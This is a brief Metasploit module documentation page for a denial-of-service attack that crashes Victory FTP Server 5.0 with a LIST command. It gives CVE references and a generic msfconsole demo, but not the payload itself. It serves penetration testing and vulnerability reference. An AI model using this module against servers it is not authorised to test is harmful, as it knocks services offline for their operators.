## Victory FTP Server 5.0 LIST DoS

The Victory FTP Server v5.0 can be brought down by sending a 
very simple LIST command


## Module Name
auxiliary/dos/windows/ftp/vicftps50_list

## Authors
kris katterjohn


## References
* http://cvedetails.com/cve/2008-2031/
* http://cvedetails.com/cve/2008-6829/
* http://www.osvdb.org/44608
* https://www.exploit-db.com/exploits/6834




## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/dos/windows/ftp/vicftps50_list
msf auxiliary(vicftps50_list) > show targets
   ... a list of targets ...
msf auxiliary(vicftps50_list) > set TARGET <target-id>
msf auxiliary(vicftps50_list) > show options
   ... show and set options ...
msf auxiliary(vicftps50_list) > run
```
    
    